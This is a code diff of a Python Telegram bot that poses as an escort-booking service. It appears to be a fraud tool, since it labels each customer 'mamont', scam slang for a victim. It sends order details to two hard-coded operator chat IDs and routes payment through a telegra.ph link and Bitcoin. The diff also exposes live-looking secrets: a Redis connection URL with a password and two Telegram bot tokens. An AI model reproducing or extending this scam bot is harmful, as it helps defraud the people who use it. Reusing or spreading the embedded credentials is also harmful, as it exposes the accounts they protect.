@@ -6,7 +6,7 @@ from redis import StrictRedis
 
 r = redis.from_url('redis://h:pb75f7d4e39e3203fa456be4b497fdc9caf807cc493d2c9ab54a969338780b8ab@ec2-34-246-8-129.eu-west-1.compute.amazonaws.com:30799')
 
-TOKEN = '1060519841:AAF-mUfKpKKrSYc5r-rCxOaRoBPZ1lPgLzc'
+TOKEN = '1013766597:AAHUP-oKh8S2SpzCBpIQoGnSUh_AfjNsmRo'
 bot = telebot.TeleBot(TOKEN)
 
 heart = emojize(':heart:', use_aliases=True)
@@ -338,40 +338,12 @@ def katalog(message):
 
 def adress(message):
     bot.delete_message(message.chat.id, message.message_id)
-    language = r.get('language' + str(message.chat.id)).decode('utf-8')
-    if str(language) == 'ukr':
-        bot.send_message(message.chat.id, "Отправьте боту ваш адрес")
-    else:
-        bot.send_message(message.chat.id, "Enter your adress")
-    print (str(message.message_id))
-    r.set('messid' + str(message.chat.id), str(message.message_id))
-    bot.register_next_step_handler(message, numphone)
-
-
-def numphone(message):
-    r.set('adress' + str(message.chat.id), str(message.text))
-    bot.delete_message(message.chat.id, message.message_id)
-    language = r.get('language' + str(message.chat.id)).decode('utf-8')
-    if str(language) == 'ukr':
-        bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id - 1, text='Введите номер телефона для связи с вами \nНа '
-                                                                       'него будет звонить девушка по приезду на '
-                                                                       'адрес')
-    else:
-        bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id - 1,
-                              text="Enter the phone number to contact you \nThe girl on arrival will call to you")
-    bot.register_next_step_handler(message, amounthourses)
-
-
-def amounthourses(message):
-    bot.delete_message(message.chat.id, message.message_id)
     r.set('numphone' + str(message.chat.id), str(message.text))
     language = r.get('language' + str(message.chat.id)).decode('utf-8')
     if str(language) == 'ukr':
-        bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id - 2,
-                              text="Введите количество часов")
+        bot.send_message(message.chat.id, "Введите количество часов")
     else:
-
-        bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id - 2, text="Enter the number of hours")
+        bot.send_message(message.chat.id, "Enter the number of hours")
     bot.register_next_step_handler(message, price)
 
 
@@ -409,77 +381,29 @@ def price(message):
 
 
 def order(message):
-    messid = r.get('messid' + str(message.chat.id)).decode('utf-8')
-    messid = int(messid)
-    messid += 1
-    bot.delete_message(message.chat.id, messid)
     bot.delete_message(message.chat.id, message.message_id)
     number_of_whore = r.get((str('nomershluhi') + str(message.chat.id))).decode('utf-8')
-    phone = r.get('numphone' + str(message.chat.id)).decode('utf-8')
-    adres = r.get('adress' + str(message.chat.id)).decode('utf-8')
     name = r.get(int(number_of_whore) + int(100)).decode('utf-8')
     priceuah = r.get('price' + str(message.chat.id)).decode('utf-8')
     mamont = r.get(str('Username') + str(message.chat.id)).decode('utf-8')
     keyboard = telebot.types.InlineKeyboardMarkup()
     messto = telebot.types.InlineKeyboardMarkup()
-    language = r.get('language' + str(message.chat.id)).decode('utf-8')
-    if str(language) == 'ukr':
-        keyboard.row(
-            telebot.types.InlineKeyboardButton("Оплатить UAH", url='https://telegra.ph/Oplata-11-15'),
-            telebot.types.InlineKeyboardButton("Оплатить Bitcoin", callback_data='bitcoin')
-        )
-        keyboard.row(
-            telebot.types.InlineKeyboardButton("Отменить заказ", callback_data='kataloog')
-        )
-    else:
-        keyboard.row(
-            telebot.types.InlineKeyboardButton("Pay UAH", url='https://telegra.ph/Oplata-11-15'),
-            telebot.types.InlineKeyboardButton("Pay Bitcoin", callback_data='bitcoin')
-        )
-        keyboard.row(
-            telebot.types.InlineKeyboardButton("Cancel order", callback_data='kataloog')
-        )
     bot.send_message(message.chat.id,
-                     "Сверьте данные и оплатите услугу \nДевушка приедет в течение 30-40 минут после оплаты и оповестит "
-                     "вас звонком\n\nДевушка: " +
+                     "В скором времени с вами свяжется оператор. В среднем это занимает 10-15мин\n"
                      str(name) +
-                     "\nАдрес: " + str(adres) +
-                     "\nНомер телефона: " + str(phone) +
-                     "\nЦена: " + str(priceuah) + "UAH", reply_markup=keyboard)
+                     "\nЦена: " + str(priceuah) + "UAH")
     bot.send_message(697601461,
                      "Заявка создана\n"
                      "\nМамонт: @" + str(mamont) +
                      "\nID: " + str(message.chat.id) +
-                     "\nШлюха: " + name +
-                     "\nНомер телефона: " + str(phone) +
-                     "\nАдрес: " + str(adres))
+                     "\nШлюха: " + name 
+                    )
     bot.send_message(936806920,
                      "Заявка создана\n"
                      "\nМамонт: @" + str(mamont) +
                      "\nID: " + str(message.chat.id) +
-                     "\nШлюха: " + name +
-                     "\nНомер телефона: " + str(phone) +
-                     "\nАдрес: " + str(adres))
+                     "\nШлюха: " + name)
     bot.register_next_step_handler(message, pay)
-
-
-def pay(message):
-    language = r.get('language' + str(message.chat.id)).decode('utf-8')
-    if str(language) == 'ukr':
-        if str(message.text) == 'back':
-            menu(message)
-        else:
-            bot.delete_message(message.chat.id, message.message_id)
-            bot.send_message(message.chat.id, "Данные отправлены на проверку оператором")
-            bot.register_next_step_handler(message, pay)
-    else:
-        if str(message.text) == 'back':
-            menu(message)
-        else:
-            bot.delete_message(message.chat.id, message.message_id)
-            bot.send_message(message.chat.id, "Transaction in progress")
-            bot.register_next_step_handler(message, pay)
-
 
 def support(message):
     keyboard = telebot.types.InlineKeyboardMarkup()
